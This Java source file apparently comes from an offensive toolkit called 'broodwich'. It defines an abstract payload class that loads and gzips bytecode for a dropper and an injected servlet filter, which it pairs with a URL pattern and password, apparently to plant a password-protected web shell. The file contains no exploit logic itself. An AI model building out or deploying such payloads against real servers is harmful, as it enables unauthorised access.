package party.itistimeto.broodwich.payloads;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.security.NoSuchAlgorithmException;
import java.util.zip.GZIPOutputStream;

// todo: gzip support

public abstract class AbstractPayload {
    final String urlPattern;
    final String password;
    final Class filterClass = party.itistimeto.broodwich.droppers.BroodwichFilter.class;
    final byte[] filterBytecode;
    final byte[] compressedFilterBytecode;
    final Class dropperClass;
    final byte[] dropperBytecode;
    final byte[] compressedDropperBytecode;

    AbstractPayload(String urlPattern, Class dropperClass, String password) throws NoSuchAlgorithmException, URISyntaxException, IOException {
        this.urlPattern = urlPattern;
        this.dropperClass = dropperClass;

        ClassLoader cl = this.getClass().getClassLoader();
        this.filterBytecode = getResourceBytes(classToResource(filterClass));
        this.dropperBytecode = getResourceBytes(classToResource(dropperClass));

        var bos = new ByteArrayOutputStream();
        var gis = new GZIPOutputStream(bos);
        gis.write(this.filterBytecode);
        gis.finish();
        this.compressedFilterBytecode = bos.toByteArray();
        bos.reset();
        gis = new GZIPOutputStream(bos);
        gis.write(this.dropperBytecode);
        gis.finish();
        this.compressedDropperBytecode = bos.toByteArray();

        this.password = password;
    }

    // todo: move to util class
    public static String classToResource(Class clazz) {
        return clazz.getName().replace('.', '/') + ".class";
    }

    @Override
    public abstract String toString();

    public abstract byte[] toBytes();

    static String getResourceText(String resourceName) throws URISyntaxException, IOException {
        return new String(getResourceBytes(resourceName));
    }

    // todo: move to utility class
    public static byte[] getResourceBytes(String resourceName) throws IOException {
        return AbstractPayload.class.getClassLoader().getResourceAsStream(resourceName).readAllBytes();
    }
}
